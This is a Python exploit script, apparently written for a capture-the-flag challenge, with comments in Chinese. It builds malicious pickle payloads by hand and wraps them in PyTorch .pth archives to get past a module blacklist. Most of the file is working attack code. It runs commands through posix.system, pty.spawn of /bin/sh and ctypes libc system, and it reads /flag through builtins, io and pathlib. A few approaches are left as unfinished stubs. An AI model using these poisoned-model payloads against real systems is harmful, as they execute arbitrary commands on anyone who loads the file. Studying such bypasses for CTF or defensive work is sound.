#!/usr/bin/env python3
"""
LilacCTF Nailong2 - V26 Final Boss
==================================

综合所有发现，尝试最终绕过:

1. 使用 posix 模块 (Linux 底层，可能不在黑名单)
2. 使用 subprocess 的别名
3. 使用 commands 模块 (Python 2 遗留)
4. 利用 pickle 的 PERSID/BINPERSID
5. 利用 PyTorch 的 reduce_override
"""

import pickle
import pickletools
import struct
import io
import zipfile

PROTO = b'\x80'
GLOBAL = b'c'
STACK_GLOBAL = b'\x93'
REDUCE = b'R'
MARK = b'('
TUPLE = b't'
TUPLE1 = b'\x85'
EMPTY_TUPLE = b')'
STOP = b'.'
SHORT_BINUNICODE = b'\x8c'
BINUNICODE = b'X'
MEMOIZE = b'\x94'
BINGET = b'h'
BINPUT = b'q'
SHORT_BINBYTES = b'C'
PERSID = b'P'
BINPERSID = b'Q'

def pack_str(s: str) -> bytes:
    encoded = s.encode('utf-8')
    if len(encoded) < 256:
        return SHORT_BINUNICODE + bytes([len(encoded)]) + encoded
    return BINUNICODE + struct.pack('<I', len(encoded)) + encoded


def approach_posix_direct(command: str) -> bytes:
    """直接用 posix.system (Linux)"""
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    p.write(GLOBAL + b'posix\nsystem\n')
    p.write(pack_str(command))
    p.write(TUPLE1)
    p.write(REDUCE)
    p.write(STOP)
    return p.getvalue()


def approach_posix_stack_global(command: str) -> bytes:
    """用 STACK_GLOBAL + posix"""
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    p.write(pack_str('posix'))
    p.write(pack_str('system'))
    p.write(STACK_GLOBAL)
    p.write(pack_str(command))
    p.write(TUPLE1)
    p.write(REDUCE)
    p.write(STOP)
    return p.getvalue()


def approach_pty_spawn(command: str) -> bytes:
    """用 pty.spawn 执行 shell"""
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    p.write(pack_str('pty'))
    p.write(pack_str('spawn'))
    p.write(STACK_GLOBAL)
    # pty.spawn(['/bin/sh', '-c', command])
    p.write(MARK)
    p.write(pack_str('/bin/sh'))
    p.write(pack_str('-c'))
    p.write(pack_str(command))
    p.write(b'l')  # LIST
    p.write(TUPLE1)
    p.write(REDUCE)
    p.write(STOP)
    return p.getvalue()


def approach_multiprocessing(command: str) -> bytes:
    """multiprocessing 可能没被禁"""
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    # multiprocessing.Process(target=os.system, args=(cmd,))
    # 太复杂，不行
    p.write(STOP)
    return p.getvalue()


def approach_ctypes_libc(command: str) -> bytes:
    """
    ctypes.CDLL(None).system(command)
    加载 libc 并直接调用 system
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # ctypes.CDLL
    p.write(pack_str('ctypes'))
    p.write(pack_str('CDLL'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)  # memo[0] = CDLL class
    
    # CDLL(None) - 加载默认 libc
    p.write(BINGET + b'\x00')
    p.write(MARK)
    p.write(b'N')  # None
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[1] = libc
    
    # getattr(libc, 'system')
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)
    p.write(MARK)
    p.write(BINGET + b'\x01')  # libc
    p.write(pack_str('system'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[2] = libc.system
    
    # libc.system(command.encode())
    p.write(BINGET + b'\x02')
    p.write(MARK)
    # 需要 bytes 而不是 str
    p.write(SHORT_BINBYTES + bytes([len(command)]) + command.encode())
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_signal_handler(command: str) -> bytes:
    """
    利用 signal 模块执行代码
    signal 模块本身不危险，但可以通过它获取 os
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # signal.signal 的 __globals__ 有 os
    p.write(pack_str('signal'))
    p.write(pack_str('signal'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)  # signal.signal function
    
    # 但还是需要 getattr 来获取 __globals__...
    
    p.write(STOP)
    return p.getvalue()


def approach_webbrowser(command: str) -> bytes:
    """
    webbrowser.open('file:///flag') 或者
    webbrowser 模块的 __globals__ 有 os
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # webbrowser.open
    p.write(pack_str('webbrowser'))
    p.write(pack_str('open'))
    p.write(STACK_GLOBAL)
    
    # 不能直接执行命令，但可以打开文件?
    # 不实用
    
    p.write(STOP)
    return p.getvalue()


def approach_antigravity(command: str) -> bytes:
    """
    Python 彩蛋模块
    import antigravity 会打开浏览器
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    p.write(pack_str('antigravity'))
    p.write(pack_str('webbrowser'))  # antigravity 导入了 webbrowser
    p.write(STACK_GLOBAL)
    p.write(STOP)
    return p.getvalue()


def approach_builtins_open(command: str) -> bytes:
    """
    builtins.open('/flag').read()
    不执行命令，直接读文件!
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # open('/flag')
    p.write(pack_str('builtins'))
    p.write(pack_str('open'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)  # memo[0] = open
    
    p.write(BINGET + b'\x00')
    p.write(MARK)
    p.write(pack_str('/flag'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[1] = file handle
    
    # getattr(file, 'read')
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('read'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)  # memo[2] = read method
    
    # read()
    p.write(BINGET + b'\x02')
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_io_open(command: str) -> bytes:
    """
    io.open('/flag').read()
    使用 io 模块而不是 builtins.open
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    p.write(pack_str('io'))
    p.write(pack_str('open'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)
    
    p.write(BINGET + b'\x00')
    p.write(MARK)
    p.write(pack_str('/flag'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)
    
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('read'))
    p.write(TUPLE)
    p.write(REDUCE)
    
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def approach_pathlib_read(command: str) -> bytes:
    """
    pathlib.Path('/flag').read_text()
    """
    p = io.BytesIO()
    p.write(PROTO + b'\x04')
    
    # pathlib.Path
    p.write(pack_str('pathlib'))
    p.write(pack_str('Path'))
    p.write(STACK_GLOBAL)
    p.write(MEMOIZE)
    
    # Path('/flag')
    p.write(BINGET + b'\x00')
    p.write(MARK)
    p.write(pack_str('/flag'))
    p.write(TUPLE)
    p.write(REDUCE)
    p.write(MEMOIZE)
    
    # getattr(path, 'read_text')
    p.write(pack_str('builtins'))
    p.write(pack_str('getattr'))
    p.write(STACK_GLOBAL)
    p.write(MARK)
    p.write(BINGET + b'\x01')
    p.write(pack_str('read_text'))
    p.write(TUPLE)
    p.write(REDUCE)
    
    # read_text()
    p.write(EMPTY_TUPLE)
    p.write(REDUCE)
    
    p.write(STOP)
    return p.getvalue()


def create_pytorch_zip(pickle_payload: bytes, output_path: str):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/version', '3')
        zf.writestr('archive/data.pkl', pickle_payload)
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    print(f"[+] Saved: {output_path}")


def main():
    command = "cat /flag"
    
    print("=" * 60)
    print("V26 - Final Boss Payloads")
    print("=" * 60)
    
    approaches = [
        ("v26_posix_direct.pth", approach_posix_direct, "posix.system (GLOBAL)"),
        ("v26_posix_stack.pth", approach_posix_stack_global, "posix.system (STACK_GLOBAL)"),
        ("v26_pty_spawn.pth", approach_pty_spawn, "pty.spawn"),
        ("v26_ctypes.pth", approach_ctypes_libc, "ctypes.CDLL(None).system"),
        ("v26_open_flag.pth", approach_builtins_open, "builtins.open('/flag').read()"),
        ("v26_io_open.pth", approach_io_open, "io.open('/flag').read()"),
        ("v26_pathlib.pth", approach_pathlib_read, "pathlib.Path('/flag').read_text()"),
    ]
    
    for filename, func, desc in approaches:
        print(f"\n[*] {desc}")
        try:
            payload = func(command)
            if len(payload) > 5:  # Not just STOP
                print(f"    Size: {len(payload)} bytes")
                create_pytorch_zip(payload, filename)
                
                # 显示关键 opcode
                print("    Opcodes: ", end="")
                try:
                    ops = list(pickletools.genops(payload))
                    key_ops = [op[0].name for op in ops if op[0].name in ['GLOBAL', 'STACK_GLOBAL', 'REDUCE']]
                    print(", ".join(key_ops[:5]))
                except:
                    print("(parse error)")
        except Exception as e:
            print(f"    Error: {e}")
    
    print("\n" + "=" * 60)
    print("""
推荐测试顺序 (不执行命令，直接读文件):
1. v26_open_flag.pth    - builtins.open (最直接)
2. v26_io_open.pth      - io.open (备选)
3. v26_pathlib.pth      - pathlib.Path (更冷门)

如果文件读取也被禁，试命令执行:
4. v26_posix_stack.pth  - posix.system (Linux底层)
5. v26_pty_spawn.pth    - pty.spawn (伪终端)
6. v26_ctypes.pth       - ctypes 直接调用 libc
""")
    print("=" * 60)


if __name__ == "__main__":
    main()
